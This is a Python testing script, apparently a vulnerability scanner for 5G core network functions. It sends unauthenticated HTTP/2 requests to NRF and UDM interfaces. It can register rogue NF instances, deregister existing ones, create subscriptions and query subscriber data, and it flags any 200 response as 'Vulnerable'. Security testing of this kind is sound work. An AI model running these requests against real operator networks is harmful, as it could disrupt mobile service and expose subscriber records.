import pycurl
import json
from io import StringIO
from colorama import Fore
import ipaddress
import re
import datetime


# timeStamp = str(datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ"))


id_regex = re.compile(
    r'([A-Za-z0-9])+[-]+[A-Za-z0-9]+[-]+[A-Za-z0-9]+[-]+[A-Za-z0-9]+[-]+[A-Za-z0-9]+')
nf_regex = re. compile(r'[A-Za-z]+')
supiOrsuci_regex = re. compile(
    r'imsi-[0-9]{5,15}|nai-.+|gli-.+|gci-.+|suci-(0-[0-9]{3}-[0-9]{2,3}|[1-7]-.+)-[0-9]{1,4}-(0-0-.+|[a-fA-F1-9]-([1-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])-[a-fA-F0-9]+)|.+')
servingNetworkName_regex = re. compile(
    r'5G:mnc[0-9]{3}[.]mcc[0-9]{3}[.]3gppnetwork[.]org(:[A-F0-9]{11})?')
mcc_regex = re.compile(r'[0-9]{3}')
mnc_regex = re.compile(r'[0-9]{2,3}')
supi_regex = re.compile(r'[0-9]{15,16}')
amfId_regex = re.compile(r'[A-Fa-f0-9]{6}')
smsfDiameterAddress_regex = re.compile(
    r'([A-Za-z0-9]+([-A-Za-z0-9]+)\.)+[a-z]{2,}')
servingNetworkName_regex = re.compile(
    r'5G:mnc[0-9]{3}[.]mcc[0-9]{3}[.]3gppnetwork[.]org(:[A-F0-9]{11})')
rand_regex = re.compile(r'[A-Fa-f0-9]{32}')
auts_regex = re.compile(r'[A-Fa-f0-9]{28}')





#########################################################  GET  ##################################################################################

def Get():

    try:
        while True:
            try:
                ip = ipaddress.ip_address(
                    input("Enter IP "+Fore.LIGHTBLACK_EX+"(Ex -  127.0.0.10)"+Fore.RESET+"- "))
                break

            except ValueError:
                print("This is NOT a VALID IP Address.")
                print('')
                continue

        while True:
            try:
                port = int(input("Enter Port "+Fore.LIGHTBLACK_EX +
                           "(Ex - 7777)"+Fore.RESET+"- "))
                break

            except ValueError:
                print("This is NOT a VALID port Number.")
                print('')
                continue

        curl = pycurl.Curl()
        curl.setopt(curl.URL, 'http://'+str(ip)+':' +
                    str(port)+'/nnrf-nfm/v1/nf-instances')
        curl.setopt(pycurl.HTTP_VERSION,
                    pycurl.CURL_HTTP_VERSION_2_PRIOR_KNOWLEDGE)
        curl.setopt(pycurl.HTTPHEADER, ['Aaccept: application/3gppHal+json'])
        curl.perform()

        status_code = curl.getinfo(pycurl.RESPONSE_CODE)
        if status_code != 200:
            print("Server returned HTTP status code {}".format(status_code))

        if status_code == 200:
            print("\nStatus :"+Fore.RED+" Vulnerable"+Fore.RESET)
            print("\nVulnerability Description :"+Fore.RED+"\nRetrieves the NF Instances that are currently registered in the NRF andthat satisfy a number of filter criteria, such as those NF Instances offering a certain service name, or those NF Instances of a given NF type(e.g., AMF). This request may only be directed at an NRF in the same PLMN. Direction: NF Service Consumer -->  NRF")
        curl.close()

    except KeyboardInterrupt:
        print('')  # Go to the next line so printing looks better.
        print('')
        return None

#######################################################  Another_GET  ##################################################################################

def Another_GET():

            try:
                while True:
                    try:
                        ip = ipaddress.ip_address(
                            input("Enter IP "+Fore.LIGHTBLACK_EX+"(Ex -  127.0.0.12)"+Fore.RESET+"- "))
                        break

                    except ValueError:
                        print("This is NOT a VALID IP Address.")
                        print('')
                        continue

                while True:
                    try:
                        port = int(input("Enter Port "+Fore.LIGHTBLACK_EX +
                                "(Ex - 7777)"+Fore.RESET+"- "))
                        break

                    except ValueError:
                        print("This is NOT a VALID port Number.")
                        print('')
                        continue

                while True:
                    supi = input("Enter supi "+Fore.LIGHTBLACK_EX +
                                        "(Ex -  123456789012345)"+Fore.RESET+"- ")
                    if re.fullmatch(supi_regex, supi):
                        break

                    else:
                        print("Enter a Valid supi")
                        print('')
                        continue

                curl = pycurl.Curl()
                curl.setopt(curl.URL, 'http://'+str(ip)+':' +
                            str(port)+'/nudm-sdm/v2/'+str(supi))
                curl.setopt(pycurl.HTTP_VERSION,
                            pycurl.CURL_HTTP_VERSION_2_PRIOR_KNOWLEDGE)
                curl.setopt(pycurl.HTTPHEADER, ['Aaccept: application/3gppHal+json'])
                curl.perform()

                status_code = curl.getinfo(pycurl.RESPONSE_CODE)
                if status_code != 200:
                    print("Server returned HTTP status code {}".format(status_code))

                if status_code == 200:
                    print("\nStatus :"+Fore.RED+" Vulnerable"+Fore.RESET)
                    print("\nRetrieve a UE's subscribed Access and Mobility Subscription Data. It is queried by the AMF after registration. Direction: AMF --> UDM ")
                curl.close()

            except KeyboardInterrupt:
                print('')  # Go to the next line so printing looks better.
                print('')
                return None

########################################################  PUT  ###################################################################################


def Put():

    try:
        curl = pycurl.Curl()
        while True:
            try:
                ip = ipaddress.ip_address(
                    input("Enter IP "+Fore.LIGHTBLACK_EX+"(Ex -  127.0.0.10)"+Fore.RESET+"- "))
                break

            except ValueError:
                print("This is NOT a VALID IP Address.")
                print('')
                continue

        while True:
            try:
                port = int(input("Enter Port "+Fore.LIGHTBLACK_EX +
                           "(Ex - 7777)"+Fore.RESET+"- "))
                break

            except ValueError:
                print("This is NOT a VALID port Number.")
                print('')
                continue

        while True:
            nf_instance_id = input("Enter NF Instance Id "+Fore.LIGHTBLACK_EX +
                                   "(Ex -  b9f2f940-c628-41ec-aa78-9163487d7302)"+Fore.RESET+"- ")
            if re.fullmatch(id_regex, nf_instance_id):
                break

            else:
                print("Enter a Valid ID")
                print('')
                continue

        while True:
            nfType = input("Enter NF Type "+Fore.LIGHTBLACK_EX +
                           "(Ex -  AUSF)"+Fore.RESET+"- ")
            if re.fullmatch(nf_regex, nfType):
                break

            else:
                print("Enter a Valid NF Type")
                print('')
                continue

        while True:
            try:
                ipv4Addresses = ipaddress.ip_address(
                    input("Enter NF IP "+Fore.LIGHTBLACK_EX+"(Ex -  127.0.0.10)"+Fore.RESET+"- "))
                break

            except ValueError:
                print("This is NOT a VALID IP Address.")
                print('')
                continue

        while True:
            try:
                port1 = int(input("Enter NF IP Port " +
                            Fore.LIGHTBLACK_EX + "(Ex - 7777)"+Fore.RESET+"- "))
                break

            except ValueError:
                print("This is NOT a VALID port Number.")
                print('')
                continue

        while True:
            allowedNfTypes = input(
                "Enter Allowed NF Type "+Fore.LIGHTBLACK_EX + "(Ex -  AMF)"+Fore.RESET+"- ")
            if re.fullmatch(nf_regex, allowedNfTypes):
                break

            else:
                print("Enter a Valid NF Type")
                print('')
                continue

        curl.setopt(pycurl.URL, 'http://'+str(ip)+':'+str(port) +
                    '/nnrf-nfm/v1/nf-instances/'+str(nf_instance_id))
        curl.setopt(pycurl.HTTP_VERSION,
                    pycurl.CURL_HTTP_VERSION_2_PRIOR_KNOWLEDGE)
        curl.setopt(pycurl.HTTPHEADER, ['Accept: application/json',
                                        'Content-Type: application/json'])
        curl.setopt(pycurl.PUT, 1)
        curl.setopt(pycurl.TIMEOUT_MS, 3000)

        body_as_dict = {"nfInstanceId":    "ffd09784-b0d8-41ec-aa1c-2578b3121d9e",
                        "nfType":    nfType.upper(),
                        "nfStatus":    "REGISTERED",
                        "ipv4Addresses":    [str(ipv4Addresses)],
                        "allowedNfTypes":    [allowedNfTypes.upper()],
                        "priority":    0,
                        "capacity":    100,
                        "load":    0,
                        "nfServices":    [{
                            "serviceInstanceId":    "ffd0a12a-b0d8-41ec-aa1c-2578b3121d9e",
                            "serviceName":    "nausf-auth",
                            "versions":    [{
                                "apiVersionInUri":    "v1",
                                "apiFullVersion":    "1.0.0"
                            }],
                            "scheme":    "http",
                            "nfServiceStatus":    "REGISTERED",
                            "ipEndPoints":    [{
                                "ipv4Address":   str(ipv4Addresses),
                                "port":    int(port1)
                            }],
                            "allowedNfTypes":    [allowedNfTypes.upper()],
                            "priority":    0,
                            "capacity":    100,
                            "load":    0
                        }],
                        "nfProfileChangesSupportInd": True
                        }

        body_as_json_string = json.dumps(body_as_dict)  # dict to json
        body_as_file_object = StringIO(body_as_json_string)
        curl.setopt(pycurl.READDATA, body_as_file_object)
        curl.setopt(pycurl.POSTFIELDSIZE, len(body_as_json_string))
        curl.perform()

        status_code = curl.getinfo(pycurl.RESPONSE_CODE)
        if status_code != 200:
            print("Server returned HTTP status code {}".format(status_code))

        if status_code == 200:
            print("\nStatus :"+Fore.RED+" Vulnerable"+Fore.RESET)
            print("\nVulnerability Description :"+Fore.RED +
                  "\nThe NF Profile of a given NF instance, and must be directed at an NRF in the same PLMN. Direction: NF Service Consumer -->  NRF")
        curl.close()

    except KeyboardInterrupt:
        print('')  # Go to the next line so printing looks better.
        print('')
        return None

###########################################################  POST  ################################################################################


def Post():

    try:

        curl = pycurl.Curl()
        while True:
            try:
                ip = ipaddress.ip_address(
                    input("Enter IP "+Fore.LIGHTBLACK_EX+"(Ex -  127.0.0.10)"+Fore.RESET+"- "))
                break

            except ValueError:
                print("This is NOT a VALID IP Address.")
                print('')
                continue

        while True:
            try:
                port = int(input("Enter Port "+Fore.LIGHTBLACK_EX +
                           "(Ex - 7777)"+Fore.RESET+"- "))
                break

            except ValueError:
                print("This is NOT a VALID port Number.")
                print('')
                continue

        while True:
            reqNfInstanceId = input("Enter Request NF Instance Id  "+Fore.LIGHTBLACK_EX +
                                    "(Ex -  b9a0d5f2-c628-41ec-905e-516c5b30fb11)"+Fore.RESET+"- ")
            if re.fullmatch(id_regex, reqNfInstanceId):
                break

            else:
                print("Enter a Valid ID")
                print('')
                continue

        while True:
            nfType = input("Enter NF Type "+Fore.LIGHTBLACK_EX +
                           "(Ex -  AMF)"+Fore.RESET+"- ")
            if re.fullmatch(nf_regex, nfType):
                break

            else:
                print("Enter a Valid NF Type")
                print('')
                continue

        while True:
            reqNfType = input("Enter Request NF Type " +
                              Fore.LIGHTBLACK_EX + "(Ex -  SMF)"+Fore.RESET+"- ")
            if re.fullmatch(nf_regex, reqNfType):
                break

            else:
                print("Enter a Valid Request NF Type")
                print('')
                continue

        curl.setopt(pycurl.URL, 'http://'+str(ip)+':' +
                    str(port)+'/nnrf-nfm/v1/subscriptions')
        curl.setopt(pycurl.HTTP_VERSION,
                    pycurl.CURL_HTTP_VERSION_2_PRIOR_KNOWLEDGE)
        curl.setopt(pycurl.HTTPHEADER, ['Accept: application/json',
                                        'Content-Type: application/json'])
        curl.setopt(pycurl.POST, 1)
        curl.setopt(pycurl.TIMEOUT_MS, 3000)

        body_as_dict = {"nfStatusNotificationUri": "http://'+str(ip)+':'+str(port)+'/nnrf-nfm/v1/nf-status-notify",
                        "reqNfInstanceId": str(reqNfInstanceId),
                        "subscrCond": {
                            "nfType": nfType.upper()
                        },
                        "reqNfType": reqNfType.upper()
                        }
        body_as_json_string = json.dumps(body_as_dict)  # dict to json
        body_as_file_object = StringIO(body_as_json_string)
        curl.setopt(pycurl.READDATA, body_as_file_object)
        curl.setopt(pycurl.POSTFIELDSIZE, len(body_as_json_string))
        curl.perform()

        status_code = curl.getinfo(pycurl.RESPONSE_CODE)
        if status_code != 200:
            print("Server returned HTTP status code {}".format(status_code))

        if status_code == 200:
            print("\nStatus :"+Fore.RED+" Vulnerable"+Fore.RESET)
            print("\nVulnerability Description :"+Fore.RED+"\nRetrieves the NF Instances that are currently registered in the NRF andthat satisfy a number of filter criteria, such as those NF Instances offering a certain service name, or those NF Instances of a given NF type(e.g., AMF). This request may only be directed at an NRF in the same PLMN. Direction: NF Service Consumer -->  NRF")

        curl.close()

    except KeyboardInterrupt:
        print('')  # Go to the next line so printing looks better.
        print('')
        return None


###########################################################  DELETE  ################################################################################

def Delete():

    try:
        crl = pycurl.Curl()
        while True:
            try:
                ip = ipaddress.ip_address(
                    input("Enter IP "+Fore.LIGHTBLACK_EX+"(Ex -  127.0.0.10)"+Fore.RESET+"- "))
                break

            except ValueError:
                print("This is NOT a VALID IP Address.")
                print('')
                continue

        while True:
            try:
                port = int(input("Enter Port "+Fore.LIGHTBLACK_EX +
                           "(Ex - 7777)"+Fore.RESET+"- "))
                break

            except ValueError:
                print("This is NOT a VALID port Number.")
                print('')
                continue

        while True:
            nf_instance_id = input("Enter NF Instance Id "+Fore.LIGHTBLACK_EX +
                                   "(Ex -  0e02d826-db22-41ec-87dd-bf9efe567155)"+Fore.RESET+"- ")
            if re.fullmatch(id_regex, nf_instance_id):
                break

            else:
                print("Enter a Valid ID")
                print('')
                continue

        crl.setopt(crl.URL, 'http://'+str(ip)+':'+str(port) +
                   '/nnrf-nfm/v1/nf-instances/'+str(nf_instance_id))
        # crl.setopt(crl.URL, "http://10.0.1.8:9393/nnrf-nfm/v1/nf-instances/9c6d1e26-cba2-41ec-811d-d3036c91479d")
        crl.setopt(pycurl.HTTP_VERSION,
                   pycurl.CURL_HTTP_VERSION_2_PRIOR_KNOWLEDGE)
        crl.setopt(crl.CUSTOMREQUEST, "DELETE")
        crl.perform()

        status_code = crl.getinfo(pycurl.RESPONSE_CODE)
        if status_code != 200:
            print("Server returned HTTP status code {}".format(status_code))

        if status_code == 200:
            print("\nStatus :"+Fore.RED+" Vulnerable"+Fore.RESET)
            print("\nVulnerability Description :"+Fore.RED +
                  "\nDeregisters a given NF Instance from the NRF. Direction: NF Service Consumer -->  NRF")
        crl.close()

    except KeyboardInterrupt:
        print('')  # Go to the next line so printing looks better.
        print('')
        return None


###########################################################  PATCH  ################################################################################


def Patch():

    try:
        crl = pycurl.Curl()
        while True:
            try:
                ip = ipaddress.ip_address(
                    input("Enter IP "+Fore.LIGHTBLACK_EX+"(Ex -  127.0.0.10)"+Fore.RESET+"- "))
                break

            except ValueError:
                print("This is NOT a VALID IP Address.")
                print('')
                continue

        while True:
            try:
                port = int(input("Enter Port "+Fore.LIGHTBLACK_EX +
                           "(Ex - 7777)"+Fore.RESET+"- "))
                break

            except ValueError:
                print("This is NOT a VALID port Number.")
                print('')
                continue

        while True:
            nf_instance_id = input("Enter NF Instance Id "+Fore.LIGHTBLACK_EX +
                                   "(Ex -  0e02d826-db22-41ec-87dd-bf9efe567155)"+Fore.RESET+"- ")
            if re.fullmatch(id_regex, nf_instance_id):
                break

            else:
                print("Enter a Valid ID")
                print('')
                continue

        crl.setopt(crl.URL, 'http://'+str(ip)+':'+str(port) +
                   '/nnrf-nfm/v1/nf-instances/'+str(nf_instance_id))
        crl.setopt(pycurl.HTTP_VERSION,
                   pycurl.CURL_HTTP_VERSION_2_PRIOR_KNOWLEDGE)
        crl.setopt(crl.CUSTOMREQUEST, 'PATCH')
        crl.perform()

        status_code = crl.getinfo(pycurl.RESPONSE_CODE)
        if status_code != 200:
            print("Server returned HTTP status code {}".format(status_code))

        if status_code == 200:
            print("\nStatus :"+Fore.RED+" Vulnerable"+Fore.RESET)
            print("\nVulnerability Description :"+Fore.RED +
                  "\nDeregisters a given NF Instance from the NRF. Direction: NF Service Consumer -->  NRF")
        crl.close()

    except KeyboardInterrupt:
        print('')  # Go to the next line so printing looks better.
        print('')
        return None


# ## SDM
# ### Retrieve_AM_Data
# def fun1():
#     curl = pycurl.Curl()
#     curl.setopt(curl.URL, 'http://10.0.1.8:9494/nudm-sdm/v2/901700000000001/am-data?plmn-id=%7B%0A%20%20%22mcc%22%3A%20%22901%22%2C%0A%20%20%22mnc%22%3A%20%2270%22%0A%7D')
#     curl.setopt(pycurl.HTTP_VERSION, pycurl.CURL_HTTP_VERSION_2_PRIOR_KNOWLEDGE)
#     curl.setopt(pycurl.HTTPHEADER, ['Aaccept: application/json'])
#     curl.perform()
# # fun()

# ### retrive_smf_data
# def fun2():
#     curl = pycurl.Curl()
#     curl.setopt(curl.URL, 'http://10.0.1.8:9494/nudm-sdm/v2/901700000000001/smf-select-data?plmn-id=%7B%0A%20%20%22mcc%22%3A%20%22901%22%2C%0A%20%20%22mnc%22%3A%20%2270%22%0A%7D')
#     curl.setopt(pycurl.HTTP_VERSION, pycurl.CURL_HTTP_VERSION_2_PRIOR_KNOWLEDGE)
#     curl.setopt(pycurl.HTTPHEADER, ['Aaccept: application/json'])
#     curl.perform()

# ## UEAU
# def fun3():
#     curl = pycurl.Curl()
#     curl.setopt(pycurl.URL, 'http://10.0.1.8:9494/nudm-ueau/v1/12345678901234/security-information/generate-auth-data')
#     curl.setopt(pycurl.HTTP_VERSION, pycurl.CURL_HTTP_VERSION_2_PRIOR_KNOWLEDGE)
#     curl.setopt(pycurl.HTTPHEADER, ['Accept: application/json',
#                                     'Content-Type: application/json'])
#     curl.setopt(pycurl.POST, 1)
#     curl.setopt(pycurl.TIMEOUT_MS, 3000)

#     body_as_dict = {"servingNetworkName":"5G:mnc001.mcc001.3gppnetwork.org",
# "ausfInstanceId":"89a350f8-9a1a-41ec-9859-25ad03234e2a"
#     }
#     body_as_json_string = json.dumps(body_as_dict) # dict to json
#     body_as_file_object = StringIO(body_as_json_string)
#     curl.setopt(pycurl.READDATA, body_as_file_object)
#     curl.setopt(pycurl.POSTFIELDSIZE, len(body_as_json_string))
#     curl.perform()
#     status_code = curl.getinfo(pycurl.RESPONSE_CODE)
#     if status_code != 200:
#         print ("Server returned HTTP status code {}".format(status_code))
#     curl.close()
